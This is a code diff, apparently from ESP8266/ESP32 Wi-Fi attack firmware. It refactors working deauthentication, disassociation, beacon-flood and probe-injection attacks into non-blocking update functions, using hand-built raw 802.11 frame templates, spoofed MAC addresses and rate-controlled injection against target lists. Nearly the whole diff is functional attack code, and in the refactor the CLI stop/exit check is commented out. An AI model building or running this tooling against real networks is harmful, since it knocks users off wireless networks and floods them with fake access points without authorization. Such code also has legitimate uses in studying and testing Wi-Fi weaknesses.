@@ -20,7 +20,7 @@ extern "C" {
 }
 
 // ========== DEAUTH ========== //
-uint8_t deauth_data[] = {
+uint8_t deauth_pkt[] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
     /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
@@ -31,7 +31,7 @@ uint8_t deauth_data[] = {
 };
 
 // ========== BEACON ========== //
-uint8_t beacon_data[] = {
+uint8_t beacon_pkt[] = {
     // [22]
     /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination MAC
@@ -83,7 +83,7 @@ uint8_t beacon_data[] = {
     /*107 -108 */ 0x00, 0x00
 };
 
-uint8_t probe_data[] = {
+uint8_t probe_pkt[] = {
     /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
     /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
@@ -110,6 +110,35 @@ uint8_t probe_data[] = {
     /*    67   */ 0x6c                                // 54
 };
 
+typedef struct deauth_attack_data_t {
+    TargetList    targets;
+    bool          deauth;
+    bool          disassoc;
+    unsigned long rate;
+    unsigned long timeout;
+    unsigned long pkts;
+    unsigned long start_time;
+    unsigned long output_time;
+    unsigned long pkts_sent;
+    unsigned long pkts_per_second;
+    unsigned long pkt_time;
+    unsigned long pkt_interval;
+} deauth_attack_data_t;
+
+typedef struct beacon_attack_data_t {
+    StringList    ssids;
+    uint8_t       from[6];
+    uint8_t       to[6];
+    int           enc;
+    uint8_t       ch;
+    unsigned long timeout;
+    unsigned long start_time;
+    unsigned long output_time;
+    unsigned long pkts_sent;
+    unsigned long pkts_per_second;
+    unsigned long pkt_time;
+    unsigned long pkt_interval;
+} beacon_attack_data_t;
 
 namespace packetinjector {
     bool send(uint8_t ch, uint8_t* buf, uint16_t len) {
@@ -118,19 +147,19 @@ namespace packetinjector {
     }
 
     bool send_deauth(uint8_t ch, uint8_t* from, uint8_t* to) {
-        deauth_data[0] = 0xc0;
-        memcpy(&deauth_data[10], from, 6);
-        memcpy(&deauth_data[16], from, 6);
-        memcpy(&deauth_data[4], to, 6);
-        return send(ch, deauth_data, sizeof(deauth_data));
+        deauth_pkt[0] = 0xc0;
+        memcpy(&deauth_pkt[10], from, 6);
+        memcpy(&deauth_pkt[16], from, 6);
+        memcpy(&deauth_pkt[4], to, 6);
+        return send(ch, deauth_pkt, sizeof(deauth_pkt));
     }
 
     bool send_disassoc(uint8_t ch, uint8_t* from, uint8_t* to) {
-        deauth_data[0] = 0xa0;
-        memcpy(&deauth_data[10], from, 6);
-        memcpy(&deauth_data[16], from, 6);
-        memcpy(&deauth_data[4], to, 6);
-        return send(ch, deauth_data, sizeof(deauth_data));
+        deauth_pkt[0] = 0xa0;
+        memcpy(&deauth_pkt[10], from, 6);
+        memcpy(&deauth_pkt[16], from, 6);
+        memcpy(&deauth_pkt[4], to, 6);
+        return send(ch, deauth_pkt, sizeof(deauth_pkt));
     }
 
     bool send_beacon(uint8_t ch, uint8_t* from, uint8_t* to, const char* ssid, int enc) {
@@ -142,14 +171,14 @@ namespace packetinjector {
         uint8_t frame[109];
 
         // MAC header
-        memcpy(&frame[0], &beacon_data[0], 4);
+        memcpy(&frame[0], &beacon_pkt[0], 4);
         memcpy(&frame[4], to, 6);
         memcpy(&frame[10], from, 6);
         memcpy(&frame[16], from, 6);
         pkt_len += 4 + 6 + 6 + 6;
 
         // Fixed parameters
-        memcpy(&frame[22], &beacon_data[22], 14);
+        memcpy(&frame[22], &beacon_pkt[22], 14);
         pkt_len += 14;
 
         // SSID
@@ -159,11 +188,11 @@ namespace packetinjector {
         pkt_len += 2 + ssid_len;
 
         // Supported Rates
-        memcpy(&frame[pkt_len], &beacon_data[70], 10);
+        memcpy(&frame[pkt_len], &beacon_pkt[70], 10);
         pkt_len += 10;
 
         // Channel
-        memcpy(&frame[pkt_len], &beacon_data[80], 2);
+        memcpy(&frame[pkt_len], &beacon_pkt[80], 2);
         frame[pkt_len] = ch;
         pkt_len       += 2 + 1;
 
@@ -175,7 +204,7 @@ namespace packetinjector {
             case ENCRYPTION_WPA2:
                 frame[34] = 0x31;
 
-                memcpy(&frame[pkt_len], &beacon_data[83], 26);
+                memcpy(&frame[pkt_len], &beacon_pkt[83], 26);
                 pkt_len += 26;
 
                 return send(ch, frame, pkt_len);
@@ -185,16 +214,19 @@ namespace packetinjector {
     }
 
     bool send_probe(uint8_t ch, uint8_t* from, const char* ssid) {
-        memcpy(&probe_data[10], from, 6);
-        // beacon_data[25] = strlen(ssid);
-        memset(&probe_data[26], 0, 32);
-        return send(ch, probe_data, sizeof(probe_data));
+        memcpy(&probe_pkt[10], from, 6);
+        // probe_pkt[25] = strlen(ssid);
+        memset(&probe_pkt[26], 0, 32);
+        return send(ch, probe_pkt, sizeof(probe_pkt));
     }
 }
 
 namespace attack {
+    beacon_attack_data_t beacon_data;
+    deauth_attack_data_t deauth_data;
+
     // ========== Attacks =========== //
-    void beacon(StringList& ssid_list, uint8_t* from, uint8_t* to, int enc, uint8_t ch, unsigned long timeout) {
+    void startBeacon(StringList& ssid_list, uint8_t* from, uint8_t* to, int enc, uint8_t ch, unsigned long timeout) {
         { // Error checks
             if (ssid_list.size() == 0) {
                 debugln("ERROR: No SSIDs specified");
@@ -245,54 +277,21 @@ namespace attack {
             debugln("Type 'stop' or 'exit' to stop the attack");
         }
 
-        uint8_t last_byte = from[5];
-
-        unsigned long start_time  = millis();
-        unsigned long output_time = millis();
-
-        unsigned long pkts_sent       = 0;
-        unsigned long pkts_per_second = 0;
-
-        unsigned long pkt_time     = millis();
-        unsigned long pkt_interval = 100;
-
-        bool running = true;
-
-        while (running) {
-            if (millis() - pkt_time >= pkt_interval) {
-                pkt_time = millis();
-                ssid_list.begin();
-
-                for (int i = 0; running && i<ssid_list.size(); ++i) {
-                    from[5] = last_byte + i;
-
-                    String ssid = ssid_list.iterate();
-
-                    pkts_per_second += packetinjector::send_beacon(ch, from, to, ssid.c_str(), enc);
-                    delay(1);
-
-                    running = !(cli::read_exit() || (timeout > 0 && millis() - start_time > timeout));
-                }
-            }
-
-            if (millis() - output_time >= 1000) {
-                pkts_sent += pkts_per_second;
-
-                debug(pkts_per_second);
-                debug(" pkts/s, ");
-                debug(pkts_sent);
-                debugln(" sent ");
-
-                output_time = millis();
-
-                pkts_per_second = 0;
-            }
-        }
-
-        debugln("Beacon attack stopped");
+        beacon_data.ssids.moveFrom(ssid_list);
+        memcpy(beacon_data.from, from, 6);
+        memcpy(beacon_data.to, to, 6);
+        beacon_data.enc             = enc;
+        beacon_data.ch              = ch;
+        beacon_data.timeout         = timeout;
+        beacon_data.start_time      = millis();
+        beacon_data.output_time     = millis();
+        beacon_data.pkts_sent       = 0;
+        beacon_data.pkts_per_second = 0;
+        beacon_data.pkt_time        = millis();
+        beacon_data.pkt_interval    = 100;
     }
 
-    void deauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
+    void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
         { // Error checks
             if (targets.size() == 0) {
                 debugln("ERROR: No targets specified");
@@ -348,46 +347,105 @@ namespace attack {
             debugln("Type 'stop' or 'exit' to stop the attack");
         }
 
-        unsigned long start_time  = millis();
-        unsigned long output_time = millis();
+        deauth_data.targets.moveFrom(targets);
+        deauth_data.deauth          = deauth;
+        deauth_data.disassoc        = disassoc;
+        deauth_data.rate            = rate;
+        deauth_data.timeout         = timeout;
+        deauth_data.pkts            = pkts;
+        deauth_data.start_time      = millis();
+        deauth_data.output_time     = millis();
+        deauth_data.pkts_sent       = 0;
+        deauth_data.pkts_per_second = 0;
+        deauth_data.pkt_time        = 0;
+        deauth_data.pkt_interval    = (1000/rate) * (deauth+disassoc);
+    }
 
-        unsigned long pkts_sent       = 0;
-        unsigned long pkts_per_second = 0;
-        unsigned long pkt_time        = 0;
-        unsigned long pkt_interval    = (1000/rate) * (deauth+disassoc);
+    void updateBeacon() {
+        beacon_attack_data_t& b = beacon_data;
 
-        bool running = true;
+        if (b.ssids.size() > 0) {
+            if (/*cli::read_exit() || */ ((b.timeout > 0) && (millis() - b.start_time > b.timeout))) {
+                b.ssids.clear();
+                debugln("Beacon attack stopped");
+                return;
+            }
 
-        while (running) {
-            targets.begin();
+            if (millis() - b.pkt_time >= b.pkt_interval) {
+                b.pkt_time = millis();
+                b.ssids.begin();
 
-            while (running && targets.available()) {
-                if (millis() - pkt_time >= pkt_interval) {
-                    Target t = targets.iterate();
+                uint8_t from[6];
+                memcpy(from, b.from, 6);
 
-                    if (deauth) pkts_per_second += packetinjector::send_deauth(t.ch(), t.from(), t.to());
-                    if (disassoc) pkts_per_second += packetinjector::send_disassoc(t.ch(), t.from(), t.to());
+                uint8_t last_byte = from[5];
 
-                    pkt_time = millis();
+                for (int i = 0; i<b.ssids.size(); ++i) {
+                    from[5] = last_byte + i;
+
+                    String ssid = b.ssids.iterate();
+
+                    b.pkts_per_second += packetinjector::send_beacon(b.ch, from, b.to, ssid.c_str(), b.enc);
+                    delay(1);
                 }
-                if (millis() - output_time >= 1000) {
-                    pkts_sent += pkts_per_second;
+            }
 
-                    debug(pkts_per_second);
-                    debug(" pkts/s, ");
-                    debug(pkts_sent);
-                    debugln(" sent");
+            if (millis() - b.output_time >= 1000) {
+                b.pkts_sent += b.pkts_per_second;
 
-                    output_time = millis();
+                debug(b.pkts_per_second);
+                debug(" pkts/s, ");
+                debug(b.pkts_sent);
+                debugln(" sent ");
 
-                    pkts_per_second = 0;
-                }
-                running = !(cli::read_exit()
-                            || (timeout > 0 && millis() - start_time > timeout)
-                            || (pkts > 0 && pkts_sent >= pkts));
+                b.output_time = millis();
+
+                b.pkts_per_second = 0;
             }
         }
+    }
 
-        debugln("Deauth attack stopped");
+    void updateDeauth() {
+        deauth_attack_data_t& d = deauth_data;
+
+        if (d.targets.size() > 0) {
+            if ( /*(cli::read_exit()
+                 || */
+                ((d.timeout > 0) && (millis() - d.start_time > d.timeout))
+                || ((d.pkts > 0) && (d.pkts_sent >= d.pkts))) {
+                d.targets.clear();
+                debugln("Deauth attack stopped");
+                return;
+            }
+
+            if (millis() - d.output_time >= 1000) {
+                d.pkts_sent += d.pkts_per_second;
+
+                debug(d.pkts_per_second);
+                debug(" pkts/s, ");
+                debug(d.pkts_sent);
+                debugln(" sent");
+
+                d.output_time = millis();
+
+                d.pkts_per_second = 0;
+            }
+
+            if (millis() - d.pkt_time >= d.pkt_interval) {
+                Target t = d.targets.iterate();
+
+                if (d.deauth) d.pkts_per_second += packetinjector::send_deauth(t.ch(), t.from(), t.to());
+                if (d.disassoc) d.pkts_per_second += packetinjector::send_disassoc(t.ch(), t.from(), t.to());
+
+                d.pkt_time = millis();
+            }
+
+            if (!d.targets.available()) d.targets.begin();
+        }
+    }
+
+    void update() {
+        updateBeacon();
+        updateDeauth();
     }
 }
